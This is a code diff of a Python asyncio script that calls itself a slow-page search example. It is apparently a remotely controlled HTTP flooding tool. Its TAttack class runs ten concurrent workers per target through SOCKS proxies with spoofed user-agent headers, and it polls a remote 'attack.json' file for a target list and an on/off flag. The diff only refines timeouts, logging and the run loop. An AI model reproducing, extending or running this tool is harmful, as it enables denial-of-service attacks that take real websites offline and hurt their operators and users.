@@ -4,7 +4,7 @@
 Python async
 Search slow pages example
 VladVons@gmail.com
-2022.03.06
+2022.03.05
 '''
 
 import os
@@ -19,7 +19,7 @@ from aiohttp_socks import ProxyConnector
 from bs4 import BeautifulSoup
 
 
-__version__ = 'VladVons@gmail.com, v1.01, 2022.03.06'
+__version__ = 'VladVons@gmail.com, v1.02, 2022.03.08'
 
 MaxTasks = 10
 MasterUrl = 'http://vpn2.oster.com.ua/www/temp/attack.json'
@@ -30,12 +30,14 @@ class TAttack():
         self.Parent = aParent
         self.UrlRoot = aUrlRoot
 
+        self.Sleep = 1
+        self.Timeout = 5
+        self.LogFile = 'inf_' + urlparse(self.UrlRoot).hostname + '.log'
+
         self.Urls = []
         self.TotalData = 0
         self.UrlDone = 0
-
-        self.Sleep = 1
-        self.LogFile = 'L_' + urlparse(self.UrlRoot).hostname + '.log'
+        self.IsRun = False
 
         self.Queue = asyncio.Queue()
         self.Queue.put_nowait(aUrlRoot)
@@ -49,9 +51,6 @@ class TAttack():
         print(Data)
         with open(self.LogFile, 'a+') as hFile:
             hFile.write(Data + '\n')
-
-    async def _DoGrab(self, aUrl: str, aSoup, aStatus: int, aTaskId: int):
-        raise NotImplementedError()
 
     def _GetHeaders(self) -> dict:
         OSs = ['Macintosh; Intel Mac OS X 10_15_5', 'Windows NT 10.0; Win64; x64; rv:77', 'Linux; Intel Ubuntu 20.04']
@@ -84,25 +83,27 @@ class TAttack():
 
                 if (Href.startswith(self.UrlRoot)) and \
                    (not Href.startswith('#')) and \
-                   (not Ext in ['.zip', '.pdf', '.jpg', '.png']) and \
+                   (not Ext in ['.zip', '.rar', '.pdf', '.jpg', '.jpeg', '.png', '.gif']) and \
                    (not Href in self.Urls):
                     self.Urls.append(Href)
                     self.Queue.put_nowait(Href)
-        await self._DoGrab(aUrl, aStatus, aTaskId, aDuration, Size)
+        Msg = 'task:%3d, status:%d, found:%4d, done:%4d, total:%5dM, size:%4dK, time:%7.3f, %s' % (aTaskId, aStatus, len(self.Urls), self.UrlDone, self.TotalData/1000000, Size/1000, aDuration, aUrl)
+        self._Log(Msg)
 
     async def _Worker(self, aTaskId: int):
         await asyncio.sleep(aTaskId)
-        Timeout = 5
+        TimeStart = time.time()
 
-        while (True):
+        self.IsRun = True
+        while (self.IsRun):
             await self.Event.wait()
             await asyncio.sleep(self.Sleep)
 
-            if (self.Queue.empty()):
+            if (self.Queue.empty()) and (time.time() - TimeStart > 30):
                 break
 
             try:
-                Url = await asyncio.wait_for(self.Queue.get(), timeout=Timeout)
+                Url = await asyncio.wait_for(self.Queue.get(), timeout = self.Timeout)
     
                 async with aiohttp.ClientSession(connector=self._GetConnector()) as Session:
                     TimeStart = time.time()
@@ -112,11 +113,11 @@ class TAttack():
             except (aiohttp.ClientConnectorError, aiohttp.ClientError) as E:
                 self._Log('Err:%s, %s' % (Url, E))
             except asyncio.TimeoutError:
-                print('Err:%s, queue timeout %d' % (self.UrlRoot, Timeout))
+                self._Log('Err:%s, queue timeout %d' % (self.UrlRoot, Timeout))
             except Exception as E:
-                print('Err:', Url, E)
+                self._Log('Err:%s, %s'% (Url, E))
 
-        print('Done %s, task %d' % (self.UrlRoot, aTaskId))
+        self._Log('Done %s, task %d' % (self.UrlRoot, aTaskId))
 
     def Wait(self, aEnable: bool):
         if (aEnable):
@@ -127,15 +128,10 @@ class TAttack():
     async def Run(self, aMaxTasks: int):
         Tasks = [asyncio.create_task(self._Worker(i)) for i in range(aMaxTasks)]
         await asyncio.gather(*Tasks)
+        self.IsRun = False
         print('Done %s' % (self.UrlRoot))
 
 
-class TAttackLog(TAttack):
-    async def _DoGrab(self, aUrl: str, aStatus: int, aTaskId: int, aDuration: float, aSize: int):
-        Msg = 'task:%3d, status:%d, found:%4d, done:%4d, total:%5dM, size:%4dK, time:%7.3f, %s' % (aTaskId, aStatus, len(self.Urls), self.UrlDone, self.TotalData/1000000, aSize/1000, aDuration, aUrl)
-        self._Log(Msg)
- 
-  
 class TLoader():
     def __init__(self):
         self.Data = {}
@@ -170,7 +166,7 @@ class TMain():
 
     async def Create(self, aUrls: list):
         for Url in aUrls:
-            Attack = TAttackLog(self, Url)
+            Attack = TAttack(self, Url)
             Task = asyncio.create_task(Attack.Run(MaxTasks))
             self.Tasks.append([Attack, Task])
 
@@ -186,8 +182,9 @@ class TMain():
 
     async def Run(self):
         while (True):
-            print('Check loader')
+            print('Loader check')
             if (await self.Loader.FromUrl(MasterUrl)):
+                print('Loader create')
                 self.Wait(not self.Loader.Data['run'])
 
                 self.Cancel()
